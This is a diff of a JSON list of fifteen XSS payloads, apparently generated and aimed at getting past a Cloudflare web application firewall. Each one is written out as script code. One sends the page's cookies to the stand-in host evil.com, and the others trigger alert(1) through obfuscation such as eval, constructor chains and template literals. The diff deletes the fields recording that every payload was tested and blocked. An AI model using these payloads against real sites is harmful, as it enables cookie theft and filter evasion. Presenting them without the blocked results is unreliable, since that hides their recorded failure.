@@ -10,12 +10,7 @@
       "payload": "<script>async function x(){await fetch(\"//evil.com\",{method:\"POST\",body:document.cookie})}</script>",
       "description": "Async/await exfiltration",
       "technique": "advanced",
-      "source": "generated",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "xss-1002",
@@ -24,12 +19,7 @@
       "payload": "<script>Promise.resolve().then(()=>alert(1))</script>",
       "description": "Promise-based XSS",
       "technique": "advanced",
-      "source": "generated",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "xss-1003",
@@ -38,12 +28,7 @@
       "payload": "<script>Array.from(\"alert(1)\").map(eval).join(\"\")</script>",
       "description": "Array.from obfuscation",
       "technique": "advanced",
-      "source": "generated",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "xss-1004",
@@ -52,12 +37,7 @@
       "payload": "<script>Function`a${`alert(1)`}```()</script>",
       "description": "Template literal function",
       "technique": "advanced",
-      "source": "generated",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "xss-1005",
@@ -66,12 +46,7 @@
       "payload": "<script>[].constructor.constructor`alert(1)```()</script>",
       "description": "Constructor chain",
       "technique": "advanced",
-      "source": "generated",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "xss-1006",
@@ -80,12 +55,7 @@
       "payload": "<script>class X{constructor(){alert(1)}};new X()</script>",
       "description": "ES6 class XSS",
       "technique": "advanced",
-      "source": "generated",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "xss-1007",
@@ -94,12 +64,7 @@
       "payload": "<script>let{a=alert(1)}={}</script>",
       "description": "Destructuring assignment",
       "technique": "advanced",
-      "source": "generated",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "xss-1008",
@@ -108,12 +73,7 @@
       "payload": "<script>for(let x of[alert])x(1)</script>",
       "description": "For-of loop",
       "technique": "advanced",
-      "source": "generated",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "xss-1009",
@@ -122,12 +82,7 @@
       "payload": "<script>[...`alert(1)`].map(eval)</script>",
       "description": "Spread operator",
       "technique": "advanced",
-      "source": "generated",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "xss-1010",
@@ -136,12 +91,7 @@
       "payload": "<script>({[`alert(1)`]:x}=window)</script>",
       "description": "Computed property",
       "technique": "advanced",
-      "source": "generated",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "xss-1011",
@@ -150,12 +100,7 @@
       "payload": "<script>WebAssembly.instantiate(new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,1,127,3,2,1,0,7,8,1,4,109,97,105,110,0,0,10,6,1,4,0,65,42,11]))</script>",
       "description": "WASM instantiate",
       "technique": "advanced",
-      "source": "generated",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "xss-1012",
@@ -164,12 +109,7 @@
       "payload": "<script>navigator.serviceWorker.register(\"data:text/javascript,alert(1)\")</script>",
       "description": "Service worker data URI",
       "technique": "advanced",
-      "source": "generated",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "xss-1013",
@@ -178,12 +118,7 @@
       "payload": "<script>new SharedArrayBuffer(1024)</script>",
       "description": "SharedArrayBuffer",
       "technique": "advanced",
-      "source": "generated",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "xss-1014",
@@ -192,12 +127,7 @@
       "payload": "<script>Atomics.notify(new Int32Array(new SharedArrayBuffer(4)),0)</script>",
       "description": "Atomics API",
       "technique": "advanced",
-      "source": "generated",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "xss-1015",
@@ -206,12 +136,7 @@
       "payload": "<script>BigInt(alert(1))</script>",
       "description": "BigInt coercion",
       "technique": "advanced",
-      "source": "generated",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     }
   ]
 }
